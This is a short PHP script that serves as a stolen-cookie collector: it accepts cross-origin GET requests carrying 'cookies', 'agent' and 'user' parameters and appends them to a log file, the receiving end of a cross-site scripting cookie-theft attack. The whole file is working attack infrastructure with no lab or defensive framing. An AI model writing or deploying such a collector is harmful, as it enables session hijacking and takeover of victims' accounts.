<?php
header('Access-Control-Allow-Origin: *');
if(isset($_GET["cookies"]) && isset($_GET["agent"]) && isset($_GET["user"])){
	$cookie = $_GET["cookies"];
	$userAgent = $_GET["agent"];
	$user = $_GET["user"];
	$log = "USER: " . $user . "; COOKIES: " . $cookie . "; USER-AGENT: " . $userAgent . "\n";
	file_put_contents('log.txt', $log, FILE_APPEND);
}